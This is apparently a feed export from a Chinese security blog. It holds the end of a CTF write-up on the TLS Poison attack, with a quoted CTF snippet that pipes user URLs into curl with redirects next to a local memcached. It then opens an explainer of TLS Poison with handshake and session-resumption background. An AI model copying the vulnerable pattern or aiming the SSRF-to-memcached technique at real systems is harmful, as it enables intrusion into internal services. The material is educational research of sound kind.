src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20210515015923.png" alt=""></p><h3 id="Something-else"><a href="#Something-else" class="headerlink" title="Something else"></a>Something else</h3><p>其实这个解法也是后来问的 0xbb 出题人，其实预期解法是利用 FTPS 的解法。但是比赛的时候，队友还找到了一处其他可能的地方想着 SSRF 来着，但是后来不太行，后面跟 Perfect Blue （也就是这次参赛的联合战队 perfect guesser 的联合队之一）的朋友交流了一下确实是用 TLS Poison ，并且他跟 A0E 某个师傅一样也重写了 DNS 相关部分内容2333</p><p>如果你觉得做完这个题目还觉得不过瘾，还可以去做一下 Tet CTF 的一个题目。在越南的 TetCTF 2021 当中，有一个单独的分类 Web &amp; Crypto 有这么一道题：HackEmAll-Next-Gen-Proxy ，这道题当中就比较直接：</p><p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_set_cache</span><span class="hljs-params">(_key, _value)</span>:</span></span><br><span class="line">    <span class="hljs-keyword">if</span> str(_key) != <span class="hljs-string">""</span> <span class="hljs-keyword">and</span> str(_value) != <span class="hljs-string">""</span>:</span><br><span class="line">        _cache_handle = pylibmc.Client([<span class="hljs-string">"127.0.0.1:11211"</span>], binary=<span class="hljs-literal">False</span>)</span><br><span class="line">        _cache_handle.set(_key, _value, time=<span class="hljs-number">60</span>)</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">else</span>:</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_get_cache</span><span class="hljs-params">(_key)</span>:</span></span><br><span class="line">    _cache_handle= pylibmc.Client([<span class="hljs-string">"127.0.0.1:11211"</span>], binary=<span class="hljs-literal">False</span>)</span><br><span class="line">    <span class="hljs-keyword">return</span> _cache_handle.get(_key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">parse</span><span class="hljs-params">(_url)</span>:</span></span><br><span class="line">    _cmd = [<span class="hljs-string">"curl"</span>, <span class="hljs-string">"-L"</span>, <span class="hljs-string">"-k"</span>, str(_url)]</span><br><span class="line">    _content = subprocess.check_output(_cmd)</span><br><span class="line">    <span class="hljs-keyword">return</span> _content.encode(<span class="hljs-string">'hex'</span>)</span><br></pre></td></tr></tbody></table></figure><p></p><p>这个就已经有非常明显的提示了，同样是熟悉的 Memcached ，同样是<code>-L</code>选型特地允许 curl 重定向，很标准的一道 TLS Poison 题目，这里就不再多啰嗦了。不过对于这题，以及<code>-L</code>选项，当时有选手想出使用 gopher 来做这个题，本地都能打，但是到了远程就拉垮了，原因是在新版的 curl 中，就像我们一开始验证的一样， gopher 协议已经不再是 libcurl 默认支持的重定向协议了，只有 HTTP/HTTPS 和 FTP 是默认支持重定向，具体见：<a href="https://github.com/curl/curl/commit/6080ea098d97393da32c6f66eb95c7144620298c" target="_blank" rel="noopener">https://github.com/curl/curl/commit/6080ea098d97393da32c6f66eb95c7144620298c</a></p><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>至此，本篇加上之前的 <a href="https://blog.zeddyu.info/2021/04/20/tls-poison/">《一篇文章带你读懂 TLS Poison 攻击》</a> ，基本上算是把 TLS Poison 的理论、实践、 CTF 应用都讲了一遍，或许以后可能还会弄个 TLS Poison 攻击 SMTP 的靶场（应该不太可能），但是 TLS Poison 需要探索的内容依旧还有很多，比如对于显式 FTPS 的 TLS Poison 利用化工具，如果没有了<code>PASV</code>漏洞，FTPS 还有没有其他方式利用等等问题，都是还有待大家进一步去挖掘的。</p><p>这些天都花了很多精力在部分研究上，一方面确实我觉得 TLS Poison 是一个很精彩的攻击方式，尽管它局限性很大，但是这个攻击整体构造利用都相对比较巧妙，也是对在众多对 TLS 密码算法的攻击中令人耳目一新；一方面对于 CTF 题目，尤其是 hxp 这个题目我一直耿耿于怀，况且正好这个也是 TLS Poison 的深层次利用，这也成为了后来我整理 TLS Poison 攻击的动力来源之一，并且我也觉得 FTP 真是个非常有意思的协议，而这题预期用到 FTPS 就必须弄懂 TLS Poison ，所以就不得不去把 TLS Poison 弄一遍。没弄之前还以为是比较难的，因为看到好几个选手都重新弄了 DNS 部分，甚至还需要重写一个 DNS Server ，不过对于恶意 TLS 服务这一块确实需要改写 TLS 服务框架才能做。</p><p>还有一方面是，我之前发朋友圈探讨 CTF 相关价值观的问题，以及 CTF 是否是信息安全最佳入门方式，@Anciety 评论说 CTF 可能不是信息安全入门方式，但是他认为是信息安全研究的入门方式。正如他所说，通过这个 CTF 题目，我对 TLS Poison 进行了更深入的探究，也有了更多的理解，这可能就是一道良好的 CTF 题目给安全研究者带来的好处之一吧，同时也带给了我很多快乐，也希望以后能遇到更多类似优秀的题目，能引导、推动我去做更多有意思更深层次的研究。</p></body></html>]]></content>
    
    <summary type="html">
    
      &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;最近总结整理了 TLS Poison 攻击相关的知识，本文会继续讲 TLS Poison 利用，以及其在 CTF 的实际运用，也通过这个题目来聊聊 FTPS 相关知识。&lt;/p&gt;
&lt;blockquote class=&quot;colorquote success&quot;&gt;&lt;p&gt;文章首发于长亭安全课堂：TLS-Poison 攻击方式在真实CTF赛题中的利用实践 &lt;a href=&quot;https://mp.weixin.qq.com/s/ZziSf69AOyXoI0IgC0UyUQ&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://mp.weixin.qq.com/s/ZziSf69AOyXoI0IgC0UyUQ&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;&lt;/body&gt;&lt;/html&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://blog.zeddyu.info/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://blog.zeddyu.info/tags/CTF/"/>
    
      <category term="Sec" scheme="https://blog.zeddyu.info/tags/Sec/"/>
    
  </entry>
  
  <entry>
    <title>一篇文章带你读懂 TLS Poison 攻击</title>
    <link href="https://blog.zeddyu.info/2021/04/20/tls-poison/"/>
    <id>https://blog.zeddyu.info/2021/04/20/tls-poison/</id>
    <published>2021-04-20T18:34:26.000Z</published>
    <updated>2021-09-27T17:45:58.724Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><p>这是《一篇文章带你读懂 XXX 攻击》系列的第二篇文章，本篇文章主要讲述 TLS Poison 攻击对应的三种攻击方式、一些可能算是“新”的 DNS Rebinding 技巧以及一些关于 IP 选择探索等内容。</p><blockquote class="colorquote success"><p>文章首发于雷神众测，分为系列文章：</p><p>一篇文章带你读懂 TLS Poison 攻击（一）<a href="https://mp.weixin.qq.com/s/tAba3-qb5YGtlzH7y6PFvg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/tAba3-qb5YGtlzH7y6PFvg</a></p><p>一篇文章带你读懂 TLS Poison 攻击（二）<a href="https://mp.weixin.qq.com/s/aIWcpIXs-jQoMXuEppj3TQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/aIWcpIXs-jQoMXuEppj3TQ</a></p><p>一篇文章带你读懂 TLS Poison 攻击（三）<a href="https://mp.weixin.qq.com/s/vBAeGaeBKnSyXUL_qmr7Gg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/vBAeGaeBKnSyXUL_qmr7Gg</a></p><p>一篇文章带你读懂 TLS Poison 攻击（四）<a href="https://mp.weixin.qq.com/s/YdV9Hlpz38d09JOdtf2PxA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/YdV9Hlpz38d09JOdtf2PxA</a></p></blockquote><a id="more"></a><p>[TOC]</p><h2 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h2><p>使用《一篇文章带你读懂 XXX 攻击》的标题是为了督促自己把一个攻击的尽可能多的细节尽可能的搞懂，也是为了提升自己的写作以及表述水平。本文旨在帮助大家了解学习 TLS Poison 攻击，希望通过一篇文章让大家读懂 TLS Poison 攻击，但是仅仅网络协议涉及到很多内容，靠本文是不可能完全读懂的，本文的内容也并非完全正确，所以也希望大家抱着怀疑的态度合理对文章提出质疑。</p><p>本文主要是对 <a href="https://www.blackhat.com/us-20/briefings/schedule/#when-tls-hacks-you-19446" target="_blank" rel="noopener">Black Hat USA 2020 - When TLS Hacks You</a> 议题的整理与复盘，该攻击是一种利用 TLS 协议特性结合客户端实现缺陷达到攻击内网应用的攻击方式，可以达到任意写入 Memcached 等内网服务的攻击效果，进而配合其他漏洞造成 RCE 等危害。</p><p>这是去年的在 black hat USA 提出的一项攻击方式，但是作者在提出这个攻击方式后，由于种种因素，他放出来的 demo 并不能直接使用，所以在对该项的研究复现中整理了很多攻击细节，以及一些可以拓展的地方，还有一些关于计算机科学知识的探索。</p><p>本文主要分成三部分，第一部分主要<strong>简单</strong>讲述一些必要的背景知识，第二部分会详细记录三种攻击方式的实现步骤，第三部分会讲述一些关于在复现过程中的一些思考以及相关探索的内容。如果还有后续的进展，我也会同步到自己的个人博客上，欢迎关注，以及前来交流：<a href="https://blog.zeddyu.info/">https://blog.zeddyu.info/</a></p><p>如果对该篇文章有任何疑问或者质疑，欢迎来信：echo emVkZHl1Lmx1QGdtYWlsLmNvbQ==|base64 -d</p><p>欢迎对协议安全等内容感兴趣的同学一起交流学习！</p><p><strong>PS: 如无特殊说明，整个实验背景均基于 Ubuntu 20.04 LTS ，curl 7.68.0 build with OpenSSL/1.1.1f  ，后文提到的 IPv6 均指的是  IPv4-mapped IPv6 addresses 这类地址</strong></p><h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h2><h3 id="TLS-Overview"><a href="#TLS-Overview" class="headerlink" title="TLS Overview"></a>TLS Overview</h3><p><strong>传输层安全性协议</strong>（英语：<strong>T</strong>ransport <strong>L</strong>ayer <strong>S</strong>ecurity，缩写：<strong>TLS</strong>）及其前身<strong>安全套接层</strong>（英语：<strong>S</strong>ecure <strong>S</strong>ockets <strong>L</strong>ayer，缩写：<strong>SSL</strong>）是一种安全协议，目的是为互联网通信提供安全及数据完整性保障。网景公司（Netscape）在1994年推出首版网页浏览器－网景导航者时，推出HTTPS协议，以SSL进行加密，这是SSL的起源。IETF将SSL进行标准化，1999年公布TLS 1.0标准文件（RFC 2246）。随后又公布TLS 1.1（RFC 4346，2006年）、TLS 1.2（RFC 5246，2008年）和TLS 1.3（RFC 8446，2018年）。在浏览器、电子邮件、即时通信、VoIP、网络传真等应用程序中，广泛使用这个协议。许多网站，如Google、Facebook 等也以这个协议来创建安全连线，发送资料。目前已成为互联网上保密通信的工业标准。</p><p>Netscape 开发了名为安全套接字层（Secure Socket Layer，SSL）的上一代加密协议，TLS 由此演变而来。TLS 1.0 版的开发实际上始于 SSL 3.1 版，但协议的名称在发布之前进行了更名，以表明它不再与 Netscape 关联。由于这个历史原因，TLS 和 SSL 这两个术语有时会互换使用。</p><p>该协议由两层组成： TLS 记录协议（TLS Record）和 TLS 握手协议（TLS Handshake）。</p><p><strong>因为本文侧重点并非 TLS 本身的加密算法流程，所以会忽略很多密码算法流程，只提其中对我们后续攻击相关的部分，密码算法部分感兴趣的读者可以自行搜索了解。</strong></p><h4 id="TLS-Handshake"><a href="#TLS-Handshake" class="headerlink" title="TLS Handshake"></a>TLS Handshake</h4><p>TLS 握手是启动使用 TLS 加密的通信会话的过程。在 TLS 握手期间，两个通信方交换消息以相互确认，彼此验证，确立它们将使用的加密算法，并就会话密钥达成共识。它定义了消息的格式和交换的顺序。这些可以根据客户端和服务器的需求而变化，也就是说，有几种可能的程序来建立连接。初始交换的结果是TLS连接成功（双方都准备好用TLS传输应用数据）或发出警报消息。</p><p>每当用户通过 HTTPS 导航到网站，并且浏览器首先开始查询网站的源站服务器时，都会进行 TLS 握手。每当其他任何通信使用 HTTPS（包括 API 调用和 HTTPS 上的 DNS 查询）时，也会发生 TLS 握手。通过 TCP 握手打开 TCP 连接后，将发生 TLS 握手。</p><p>在 TLS 握手过程中，客户端和服务器一同执行以下操作：</p><ul><li>指定将要使用的 TLS 版本（TLS 1.0、1.2、1.3 等）</li><li>决定将要使用哪些密码套件</li><li>通过服务器的公钥和 SSL 证书颁发机构的数字签名来验证服务器的身份</li><li>生成会话密钥，以在握手完成后使用对称加密</li><li>检查是否需要恢复会话</li></ul><p>TLS 握手是由客户端和服务器交换的一系列数据报或消息。TLS 握手涉及多个步骤，因为客户端和服务器要交换完成握手和进行进一步对话所需的信息。 TLS 握手的确切步骤将根据所使用的密钥交换算法的类型以及双方支持的密码套件而有所不同，RSA 密钥交换算法最为常用。但是并非所有 TLS 握手均使用非对称加密（公钥和私钥），但并非全都会在生成会话密钥的过程中使用私钥。例如 Diffie-Hellman 握手等，这里不做过多介绍。</p><h4 id="TLS-Record"><a href="#TLS-Record" class="headerlink" title="TLS Record"></a>TLS Record</h4><p>TLS Record 协议使用握手过程中创建的密钥来确保应用数据的安全。记录协议负责保护应用数据的安全，并验证其完整性和来源。它管理以下内容：将传出的消息分为可管理的块、重新组合传入的消息、压缩外发报文块和解压接收报文块（可选）、将信息验证码（Message Authentication Code, MAC）应用到外发信息并使用 MAC 验证接收信息、加密外发报文和解密接收报文。当 TLS Record 协议完成后，外发加密数据被传到传输控制协议（TCP）层进行传输。</p><h3 id="TLS-1-2"><a href="#TLS-1-2" class="headerlink" title="TLS 1.2"></a>TLS 1.2</h3><h4 id="TLS-1-2-HankShake"><a href="#TLS-1-2-HankShake" class="headerlink" title="TLS 1.2 HankShake"></a>TLS 1.2 HankShake</h4><p>由于历史原因，TLS 的前身 SSL 已经被废弃；现行趋势中，主流 TLS 版本为 1.2 ，并且 1.2 对于 1.1 的改动相对于本文重点来说并不重要，并且现在处于推广 1.3 的时代，我们这里从 TLS 1.2 开始讲起。</p><ol><li><p><strong>Client hello:</strong> 客户端发送 ClientHello 消息，指定它支持的最高 TLS 协议版本、一个随机数、一个建议的密码套件列表和建议的压缩方法。如果客户端试图执行恢复握手，它可能会发送一个会话 ID 。如果客户端可以使用应用层协议协商，它可能包括一个支持的应用协议列表，例如 HTTP/2 。</p></li><li><p><strong>Server hello:</strong> 服务器以 ServerHello 消息作出响应，包含从客户端提供的选择中选择的协议版本、随机数、密码套件和压缩方法。为了确认或允许恢复握手，服务器可以发送一个会话 ID 。选择的协议版本应该是客户端和服务器都支持的最高版本。例如，如果客户端支持 TLS 1.1 版本，服务器支持 1.2 版本，则应选择 1.1 版本；不应选择 1.2 版本。</p></li><li><p>(Optional) <strong>Certificate:</strong> 服务器向客户端发送证书或证书链。 证书链通常以服务器的公钥证书开始，并以证书颁发机构的根证书结束。 该消息是可选的，但是在需要服务器身份验证时使用。</p></li><li><p>(Optional) <strong>Certificate request:</strong> 如果服务器必须对客户端进行身份验证，则它将向客户端发送证书请求。 在Internet应用程序中，很少发送此消息。</p></li><li><p>(Optional) <strong>Server key exchange:</strong> 如果来自证书的公钥信息不足以进行密钥交换，则服务器会向客户端发送服务器密钥交换消息。 例如，在基于Diffie-Hellman（DH）的密码套件中，此消息包含服务器的DH公钥。</p></li><li><p><strong>Server hello done:</strong> 服务器告诉客户端它已经完成了其初始协商消息。</p></li><li><p>(Optional)<strong>Certificate</strong>: 如果服务器从客户端请求证书，则客户端将发送其证书链，就像服务器之前所做的一样。</p><p><strong>Note:</strong> 只有少数Internet服务器应用程序要求客户端提供证书。</p></li><li><p><strong>Client key exchange:</strong> 客户端生成用于创建用于对称加密的密钥的信息。 对于 RSA ，客户端随后使用服务器的公共密钥对该密钥信息进行加密并将其发送到服务器。 对于基于 DH 的密码套件，此消息包含客户端的 DH 公钥。</p></li><li><p>(Optional) <strong>Certificate verify:</strong> 如前所述，当客户端出示证书时，此消息由客户端发送。 其目的是允许服务器完成对客户端进行身份验证的过程。 使用此消息时，客户端使用加密哈希函数发送其进行数字签名的信息。 当服务器使用客户端的公共密钥解密此信息时，服务器便能够对客户端进行身份验证。</p></li><li><p><strong>Change cipher spec:</strong> 客户端发送一条消息，告知服务器更改为加密模式。</p></li><li><p><strong>Finished</strong>: 客户端告诉服务器已准备好开始安全数据通信。</p></li><li><p><strong>Change cipher spec:</strong> 服务器发送一条消息，告知客户端更改为加密模式。</p></li><li><p><strong>Finished:</strong> 服务器告诉客户端它已准备好开始安全数据通信，握手到此结束。</p></li><li><p><strong>Encrypted data:</strong> 客户端和服务器使用对称加密算法和在客户端问候和服务器问候期间协商的加密哈希函数，以及使用客户端在客户端密钥交换期间发送给服务器的秘密密钥进行通信。 此时可以重新协商握手。</p></li><li><p><strong>Close Messages:</strong> 在连接结束时，双方都会发送 close_notify Alert 报文，以通知对等方该连接已关闭。</p></li></ol><p>大致流程如下图所示</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part1-1/1.png" alt=""></p><p>对于不同的密钥算法又会产生稍微不一致的流程，这里并不作为重点，所以我们就不再展开描述了。</p><h4 id="TLS-1-2-Session-Resumption-Overview"><a href="#TLS-1-2-Session-Resumption-Overview" class="headerlink" title="TLS 1.2 Session Resumption Overview"></a>TLS 1.2 Session Resumption Overview</h4><p>完整的 TLS 握手产生的额外延时和计算成本对所有需要安全通信的应用程序牺牲了很多性能代价，为了帮助降低部分成本， TLS 提供了一种机制恢复会话机制，用来恢复或共享多个连接之间的相同协商的秘钥数据。会话恢复是一个重要的优化部署，简略的握手消除了一个完整的 TLS 握手往返耗时，大大降低了双方的计算成本。在 TLS 1.2 中， TLS Session Resumption 可以采用 Session ID 和会话票机制来实现。除了性能上的优势外，恢复的会话还可以用于单点登录，因为它保证了原始会话和任何恢复的会话都来自同一个客户端。</p><h4 id="TLS-1-2-Session-Resumption-Session-ID"><a href="#TLS-1-2-Session-Resumption-Session-ID" class="headerlink" title="TLS 1.2 Session Resumption - Session ID"></a>TLS 1.2 Session Resumption - Session ID</h4><p>在这种机制中，服务器在与客户端初次握手时，服务器会随机分配一个 Session ID。客户端和服务器将这个会话ID与会话密钥和连接状态一起存储。为了恢复会话，客户端将存储的会话ID与第一个协议消息（ClientHello）一起发送给服务器。如果服务器识别到了连接并愿意恢复会话，它就会用相同的会话ID来回复，重新建立各自的会话。这样就可以快速建立安全的连接，而且由于我们重用了之前协商好的会话数据，所以不会损失安全性。</p><p>Client 在一开始发送 ClientHello 消息中， ClientHello 消息中包括一个可变长度的 Session ID。如果为空则表示是一个新的会话，也就是客户端与服务端第一次握手，Server 在返回 ServerHello 时就会发送一个 Session ID ，此时内容为 Server 产生，当协商握手完成后，Session ID 就变得有效，并一直存在，直到由于超过有效时间或因为在与会话相关的连接上遇到服务器错误而被删除。如果不为空，该值就表示客户端希望重用该会话的安全参数，Server 会检查它的会话缓存以进行匹配，如果匹配成功，并且 Server 愿意在指定的会话状态下重建连接，它将会发送一个带有相同会话 ID 值的 ServerHello 消息，这时 Client 和 Server 必须都发送 ChangeCipherSpec 消息并且直接发送 Finished 消息，一旦重建立完成，Client 和 Server 可以开始交换应用层数据。如果一个会话 ID 不匹配，Server 会产生一个新的会话 ID，然后 TLS Client 和 Server 需要进行一次完整的握手。</p><p></p><figure class="highlight routeros hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Client                                                Server</span><br><span class="line"></span><br><span class="line">ClientHello                   --------&gt;</span><br><span class="line">                                                 ServerHello</span><br><span class="line">                                          [ChangeCipherSpec]</span><br><span class="line">                              &lt;--------             Finished</span><br><span class="line">[ChangeCipherSpec]</span><br><span class="line">Finished                      --------&gt;</span><br><span class="line">Application Data              &lt;-------&gt;     Application Data</span><br><span class="line"></span><br><span class="line">    Figure 2.  Message flow <span class="hljs-keyword">for</span> an abbreviated handshake</span><br></pre></td></tr></tbody></table></figure><p></p><p>在 RFC 5246 中，对 SessionID 做出了规定，其长度为 0-32 位：</p><p></p><figure class="highlight angelscript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">opaque SessionID&lt;<span class="hljs-number">0.</span><span class="hljs-number">.32</span>&gt;;</span><br></pre></td></tr></tbody></table></figure><p></p><p>同时 RFC 建议 Session ID的寿命上限为24小时，因为获得<code>master_secret</code>的攻击者可能会冒充被入侵的一方，直到相应的 Session ID 失效。</p><p>整个重用过程我们可以从下图比较直观的看到：</p><p><img 